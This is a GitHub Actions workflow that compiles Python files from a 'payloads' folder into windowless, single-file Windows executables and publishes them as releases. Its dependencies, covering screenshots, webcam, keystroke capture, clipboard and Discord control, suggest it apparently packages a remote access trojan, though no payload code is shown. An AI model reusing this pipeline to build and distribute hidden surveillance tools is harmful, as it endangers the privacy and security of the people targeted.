name: Build EXE

on:
  push:
    paths:
      - 'payloads/*.py'

jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'
      - name: Install dependencies
        run: |
          pip install pyinstaller discord.py mss opencv-python pyautogui pynput pyperclip requests psutil cryptography
      - name: Build EXE
        run: |
          pyinstaller --onefile --noconsole payloads/*.py
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: built-exe
          path: dist/*.exe
      - name: Create Release
        uses: softprops/action-gh-release@v1
        with:
          tag_name: latest
          files: dist/*.exe
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
